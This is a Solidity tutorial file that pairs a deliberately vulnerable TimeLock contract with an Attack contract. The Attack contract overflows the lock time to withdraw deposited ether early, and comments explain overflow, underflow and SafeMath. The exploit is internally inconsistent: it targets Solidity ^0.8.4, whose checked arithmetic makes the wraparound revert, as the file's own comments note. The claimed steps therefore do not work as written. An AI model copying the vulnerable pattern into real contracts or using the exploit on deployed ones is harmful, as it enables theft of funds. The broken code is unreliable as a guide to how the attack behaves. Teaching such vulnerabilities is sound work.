// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/*
1. Deploy TimeLock
2. Deploy Attack with address of TimeLock
3. Call Attack.attack sending 1 ether. You will immediately be able to
   withdraw your ether.

Underflow: when the number is smaller than the minimum range it starts counting back from the maximum number and you end up with a number that is greater than what you started with.
Overflow: when the number is too big, the part that exceeds the maximum range is count from zero again so you end with a number that is smaller than what you started with.

uint = uint256
256 = number range between  0 and 2 ^ 256 -  1

OVERFLOW:
if a number is beyond the range, solidity wraps it around then starts counting forward from 0

2 ^ 256 -  1 "+ 3" = 0, 1, "2"

UNDERFLOW:
if we have a number that is less than zero which is the minimum range, what will happen is that the number will be counted backwards from the maximum number

-1 = 2 ^ 256 - 1 
-2 = 2 ^ 256 - 2

Ways to prevent this attack:
Use SafeMath to will prevent arithmetic overflow and underflow,    
Solidity 0.8 defaults to throwing an error for overflow / underflow 
*/



contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            // 2 ^ 256 - t
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}
